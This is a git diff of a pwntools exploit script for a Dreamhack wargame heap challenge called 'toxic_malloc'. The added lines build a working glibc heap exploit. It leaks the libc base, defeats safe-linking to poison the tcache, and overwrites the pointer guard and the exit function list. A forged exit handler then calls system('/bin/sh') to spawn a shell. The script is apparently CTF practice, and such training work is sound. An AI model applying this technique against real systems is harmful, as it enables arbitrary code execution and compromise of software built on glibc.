@@ -1,6 +1,6 @@
 from pwn import *
 
-# context.log_level = 'debug'
+context.log_level = 'debug'
 # context.terminal = ['tmux', 'new-window']
 
 env = {"LD_PRELOAD": "/home/hibrian827/Wargame/Dreamhack/Pwnable/toxic_malloc/problem/deploy/libc.so.6"}
@@ -67,8 +67,29 @@ for i in range(1, 7):
   delete(0)
 
 lib_base = u64(read(0).rstrip().ljust(8, b'\x00')) - 0x21ace0
+exit_funcs = lib_base + 0x219838
+fs_base = lib_base - 0x28c0
+initial = lib_base + 0x21af00
+fake_exit_function_list = heap_base + 0x2a8
 print(hex(lib_base))
+
+update(0, p64(safe_link(heap_base+0x2a0, heap_base+0x2a0)))
+create(2, p64(safe_link(heap_base+0x2a0, fs_base+0x30)))
+create(3, b"A" * 16)
+create(4, p64(0)*2 * 2)
+
 gdb.attach(rem)
+
+delete(4)
+update(4, b"B" * 16)
+create(4, p64(safe_link(heap_base+0x2a0, exit_funcs-8)))
+create(4, p64(fake_exit_function_list)*2)
+
+create(0, p64(1) + p64(4)) # idx, flavor
+create(1, p64(rol(lib_base+lib.symbols['system'], 0x11, word_size=64)) + p64(heap_base + 0x2a0))
+
+create(2, b'/bin/sh')
+
 exit()
 
 rem.interactive()
